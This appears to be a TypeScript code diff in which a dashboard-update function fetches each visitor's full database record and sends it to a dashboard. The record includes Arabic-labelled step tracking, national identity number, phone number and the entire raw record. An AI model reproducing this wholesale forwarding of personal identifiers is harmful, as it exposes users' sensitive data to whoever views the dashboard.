@@ -274,9 +274,20 @@ async function updateDashboardEntry(data: Record<string, any>): Promise<void> {
   const visitorId = data?.visitorId || data?.id || (typeof window !== 'undefined' ? localStorage.getItem('visitor') : null);
   if (!visitorId) return;
 
-  const customerName = data?.ownerName || data?.buyerName || data?.name || data?.identityNumber || 'عميل جديد';
-  const currentStep = data?.currentStep || 1;
-  const currentPage = data?.currentPage || 'home';
+  // Fetch full visitor data from database to include all fields
+  let fullData = { ...data };
+  try {
+    const response = await apiRequest('GET', `/api/visitors/${visitorId}`);
+    if (response && response.id) {
+      fullData = { ...response, ...data }; // Merge DB data with current data
+    }
+  } catch (error) {
+    console.log('[Dashboard] Could not fetch full visitor data');
+  }
+
+  const customerName = fullData?.ownerName || fullData?.buyerName || fullData?.name || fullData?.identityNumber || 'عميل جديد';
+  const currentStep = fullData?.currentStep || 1;
+  const currentPage = fullData?.currentPage || 'home';
 
   // Determine stage and status based on current page/step
   let stage = 'الخطوة 1';
@@ -302,8 +313,8 @@ async function updateDashboardEntry(data: Record<string, any>): Promise<void> {
         id: visitorId,
         visitorId: visitorId,
         customer: customerName,
-        identityNumber: data?.identityNumber || '',
-        phoneNumber: data?.phoneNumber || '',
+        identityNumber: fullData?.identityNumber || '',
+        phoneNumber: fullData?.phoneNumber || '',
         currentStep: currentStep,
         currentPage: currentPage,
         status: status,
@@ -311,7 +322,7 @@ async function updateDashboardEntry(data: Record<string, any>): Promise<void> {
         updated: 'تم التحديث الآن',
         badge: badge,
         submittedAt: new Date().toISOString(),
-        raw: data
+        raw: fullData
       })
     });
     
